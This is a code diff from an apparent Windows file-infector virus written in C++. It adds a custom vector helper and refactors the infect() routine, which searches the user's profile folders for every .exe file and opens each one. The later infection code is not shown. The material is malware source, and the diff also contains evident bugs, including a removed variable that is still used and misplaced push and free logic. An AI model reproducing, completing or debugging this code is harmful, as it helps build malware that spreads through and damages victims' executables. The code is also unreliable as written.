@@ -97,6 +97,123 @@ struct InfectorIAT
    SHGetFolderPathAHeader getFolderPath;
 };
 
+struct CVector
+{
+   std::size_t type_size;
+   std::size_t elements;
+   void *data;
+};
+
+#define CVECTOR_CAST(v,t) (reinterpret_cast<t>((v)->data))
+#define CVECTOR_BYTES(v) ((v)->type_size * (v)->elements)
+
+CVector cvector_alloc(InfectorIAT *iat, std::size_t type_size, std::size_t elements)
+{
+   CVector result;
+   result.type_size = 0;
+   result.elements = 0;
+   result.data = nullptr;
+
+   if (type_size == 0)
+      return result;
+
+   result.type_size = type_size;
+
+   if (elements == 0)
+      return result;
+
+   result.elements = elements;
+   result.data = iat->malloc(CVECTOR_BYTES(&result));
+   return result;
+}
+
+void cvector_free(InfectorIAT *iat, CVector *vector)
+{
+   if (vector == nullptr || vector->data == nullptr)
+      return;
+
+   iat->free(vector->data);
+   vector->data = nullptr;
+   vector->elements = 0;
+}
+
+void cvector_realloc(InfectorIAT *iat, CVector *vector, std::size_t elements)
+{
+   if (vector == nullptr)
+      return;
+   
+   if (elements == 0 || elements == vector->elements)
+      return cvector_free(iat, vector);
+   
+   vector->elements = elements;
+   vector->data = iat->realloc(vector->data, CVECTOR_BYTES(vector));
+}
+
+void cvector_insert(InfectorIAT *iat, CVector *vector, std::size_t index, void *element)
+{
+   if (vector == nullptr || element == nullptr)
+      return;
+
+   if (index >= vector->elements && vector->elements != 0)
+      return;
+
+   if (vector->data == nullptr)
+   {
+      *vector = cvector_alloc(iat, vector->type_size, 1);
+      iat->memcpy(vector->data, element, vector->type_size);
+      return;
+   }
+
+   cvector_realloc(iat, vector, vector->elements+1);
+
+   if (index+1 != vector->elements)
+   {
+      /* we do it this way to prevent doing another malloc/free just to insert */
+      for (std::size_t i=1; i<vector->elements-index; ++i)
+      {
+         std::size_t src_index = vector->elements-i-1;
+         std::size_t dst_index = vector->elements-i;
+         void *src = reinterpret_cast<void *>(CVECTOR_CAST(vector,std::uint8_t *)+(vector->type_size * src_index));
+         void *dst = reinterpret_cast<void *>(CVECTOR_CAST(vector,std::uint8_t *)+(vector->type_size * dst_index));
+         iat->memcpy(dst, src, vector->type_size);
+      }
+   }
+
+   iat->memcpy(CVECTOR_CAST(vector,std::uint8_t *)+(vector->type_size * index), element, vector->type_size);
+}
+
+void cvector_remove(InfectorIAT *iat, CVector *vector, std::size_t index)
+{
+   if (vector == nullptr || index >= vector->elements)
+      return;
+
+   if (index != vector->elements-1)
+      iat->memcpy(CVECTOR_CAST(vector,std::uint8_t *)+(vector->type_size * index),
+                  CVECTOR_CAST(vector,std::uint8_t *)+(vector->type_size * (index+1)),
+                  vector->type_size * (vector->elements-index-1));
+   
+   cvector_realloc(iat, vector, vector->elements-1);
+}
+
+void cvector_push(InfectorIAT *iat, CVector *vector, void *element)
+{
+   if (vector == nullptr || element == nullptr)
+      return;
+
+   cvector_insert(iat, vector, vector->elements-1, element);
+}
+
+void cvector_dequeue(InfectorIAT *iat, CVector *vector, void *element)
+{
+   if (vector == nullptr)
+      return;
+
+   if (element != nullptr)
+      iat->memcpy(element, vector->data, vector->type_size);
+
+   cvector_remove(iat, vector, 0);
+}
+
 std::uint32_t fnv321a(const char *string)
 {
    std::uint32_t hashval = 0x811c9dc5;
@@ -232,31 +349,18 @@ int infect(void)
    iat.strncat(search_root, profile_directory, iat.strlen(profile_directory));
 
    /* create a stack of directory names to traverse */
-   std::size_t search_stack_size = 1;
-   char **search_stack = reinterpret_cast<char **>(iat.malloc(sizeof(char *) * search_stack_size));
-   search_stack[0] = search_root;
+   CVector search_stack = cvector_alloc(&iat, sizeof(char *), search_stack_size);
+   CVECTOR_CAST(&search_stack, char **)[0] = search_root;
 
-   std::size_t found_executables_size = 0;
-   char **found_executables = nullptr;
+   CVector found_executables = cvector_alloc(&iat, sizeof(char *), 0);
 
-   while (search_stack_size > 0)
+   while (search_stack.elements > 0)
    {
-      char *search_visit = search_stack[0];
+      char *search_visit;
+      cvector_dequeue(&iat, &search_stack, &search_visit);
+      
       char starSearch[] = "\\*";
       char exeSearch[] = ".exe";
-      --search_stack_size;
-
-      if (search_stack_size == 0)
-      {
-         iat.free(search_stack);
-         search_stack = nullptr;
-      }
-      else
-      {
-         iat.memcpy(&search_stack[0], &search_stack[1], sizeof(char *) * search_stack_size);
-         search_stack = reinterpret_cast<char **>(iat.realloc(search_stack, sizeof(char *) * search_stack_size));
-      }
-
       char *search_string = reinterpret_cast<char *>(iat.malloc(iat.strlen(search_visit)+iat.strlen(starSearch)+1));
       iat.memcpy(search_string, search_visit, iat.strlen(search_visit)+1);
       iat.strncat(search_string, starSearch, iat.strlen(starSearch));
@@ -283,14 +387,7 @@ int infect(void)
             iat.strncat(new_directory, slash, iat.strlen(slash));
             iat.strncat(new_directory, find_data.cFileName, iat.strlen(find_data.cFileName));
 
-            ++search_stack_size;
-            
-            if (search_stack == nullptr)
-               search_stack = reinterpret_cast<char **>(iat.malloc(sizeof(char *) * search_stack_size));
-            else
-               search_stack = reinterpret_cast<char **>(iat.realloc(search_stack, sizeof(char *) * search_stack_size));
-            
-            search_stack[search_stack_size-1] = new_directory;
+            cvector_push(&iat, &search_stack, &new_directory);
          }
          else if (iat.strnicmp(find_data.cFileName+(iat.strlen(find_data.cFileName)-4), exeSearch, iat.strlen(exeSearch)) == 0)
          {
@@ -299,14 +396,7 @@ int infect(void)
             iat.strncat(found_executable, slash, iat.strlen(slash));
             iat.strncat(found_executable, find_data.cFileName, iat.strlen(find_data.cFileName));
 
-            ++found_executables_size;
-            
-            if (found_executables == nullptr)
-               found_executables = reinterpret_cast<char **>(iat.malloc(sizeof(char *) * found_executables_size));
-            else
-               found_executables = reinterpret_cast<char **>(iat.realloc(found_executables, sizeof(char *) * found_executables_size));
-
-            found_executables[found_executables_size-1] = found_executable;
+            cvector_push(&iat, &found_executables, &found_executable);
          }
       } while (iat.findNextFile(find_handle, &find_data));
 
@@ -315,11 +405,11 @@ int infect(void)
       iat.free(search_visit);
    }
 
-   std::wcout << found_executables_size << " executables were found." << std::endl;
+   std::wcout << found_executables.elements << " executables were found." << std::endl;
 
-   for (std::size_t i=0; i<found_executables_size; ++i)
+   for (std::size_t i=0; i<found_executables.elements; ++i)
    {
-      char *executable = found_executables[i];
+      char *executable = CVECTOR_CAST(&found_executables, char **)[i];
       HANDLE exe_handle = iat.createFile(executable,
                                          GENERIC_READ,
                                          0,
@@ -384,8 +474,7 @@ int infect(void)
       iat.free(found_executables[i]);
    }
 
-   iat.free(found_executables);
-
+   cvector_free(&iat, &found_executables);
    return 0;
 }
 
